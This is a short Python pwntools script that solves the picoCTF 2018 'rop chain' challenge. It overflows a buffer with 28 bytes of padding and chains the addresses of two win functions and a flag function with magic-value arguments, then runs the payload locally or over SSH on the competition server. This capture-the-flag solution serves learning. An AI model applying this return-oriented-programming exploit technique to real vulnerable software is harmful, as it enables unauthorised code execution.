#!/usr/bin/env python2
from pwn import *
import os
import commands

# Get password from password manager
USERNAME='nighter'
PASSWORD=commands.getoutput('pass picoctf2018/nighter')

# Payload settings
vuln = ELF('./rop')
deadbaad = p32(0xDEADBAAD)
baaaaaad = p32(0xBAAAAAAD)
winaddr1 = p32(vuln.symbols['win_function1'])
winaddr2 = p32(vuln.symbols['win_function2'])
flag = p32(vuln.symbols['flag'])

padding = 'A' * 28
payload = padding + winaddr1 + winaddr2 + flag + baaaaaad + deadbaad

# Run local
def local():
	io = vuln.process()
	io.readuntil('Enter your input>')
	io.sendline(payload)
	print(io.recvall())

def remote():
	s = ssh(host='2018shell1.picoctf.com', user=USERNAME, password=PASSWORD)
	io = s.run('cd /problems/rop-chain_3_f91334c5acb91bde3de858eb8045928a; ./rop')
	io.readuntil('Enter your input>')
	io.sendline(payload)
	print(io.recv())
	print(io.recv())
	s.close()

if __name__ == '__main__':
	remote()